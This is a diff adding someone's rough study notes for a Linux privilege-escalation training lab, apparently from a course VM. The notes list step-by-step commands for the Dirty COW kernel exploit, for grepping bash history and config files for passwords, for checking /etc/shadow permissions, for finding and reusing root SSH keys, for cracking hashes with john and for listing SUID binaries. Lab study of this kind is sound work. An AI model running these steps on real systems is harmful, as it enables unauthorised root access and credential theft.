@@ -1,0 +1,105 @@
+#linux priv escalation arena
+
+given credentials
+TCM:Hacker123
+
+1-Priviledge escalation kernel Exploits
+[+] [CVE-2016-5195] dirtycow
+
+   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+   Tags: RHEL=5|6|7,debian=7|8,ubuntu=16.10|16.04|14.04|12.04
+   Download URL: https://www.exploit-db.com/download/40611
+Detection
+
+Linux VM
+
+1. In command prompt type:
+/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh
+2. From the output, notice that the OS is vulnerable to “dirtycow”.
+
+Exploitation
+
+Linux VM
+
+1. In command prompt type:
+gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
+2. In command prompt type: ./c0w
+
+Disclaimer: This part takes 1-2 minutes - Please allow it some time to work.
+
+3. In command prompt type: passwd
+4. In command prompt type: id
+
+From here, either copy /tmp/passwd back to /usr/bin/passwd or reset your machine to undo changes made to the passwd binary
+
+
+
+2-Privilidge Escalation Stored Passwords(config files)
+
+cat myvpn.ovpn:
+client
+dev tun
+proto udp
+remote 10.10.10.10 1194
+resolv-retry infinite
+nobind
+persist-key
+persist-tun
+ca ca.crt
+tls-client
+remote-cert-tls server
+auth-user-pass /etc/openvpn/auth.txt
+comp-lzo
+verb 1
+reneg-sec 0
+
+
+
+
+
+3-Stored passwords (history files)
+
+cat ~/.bash_history | grep passw
+check the history to see the user credentials
+
+4-Weakfile Permissions
+check for /etc/passwd
+check for /etc/shadow
+
+5-Privilege Escalation - SSH keys
+
+Linux VM
+
+1. In command prompt type:
+find / -name authorized_keys 2> /dev/null
+2. In a command prompt type:
+find / -name id_rsa 2> /dev/null
+3. Note the results.
+
+Exploitation
+
+Linux VM
+
+1. Copy the contents of the discovered id_rsa file to a file on your attacker VM.
+
+Attacker VM
+
+1. In command prompt type: chmod 400 id_rsa
+2. In command prompt type: ssh -i id_rsa root@<ip>
+
+You should now have a root shell :)
+
+TCM@debian:~$ find / -name id_rsa 2> /dev/null
+/backups/supersecretkeys/id_rsa
+
+6-Privilege escalation sudo (shell escaping)
+
+
+
+7-Privilege Escalation - Sudo (Abusing Intended Functionality) 
+john --wordlist=/usr/share/wordlists/nmap.lst hash.txt
+
+8-privilege escalation SUID
+ find / -type f -perm -04000 -ls 2>/dev/null
+
+
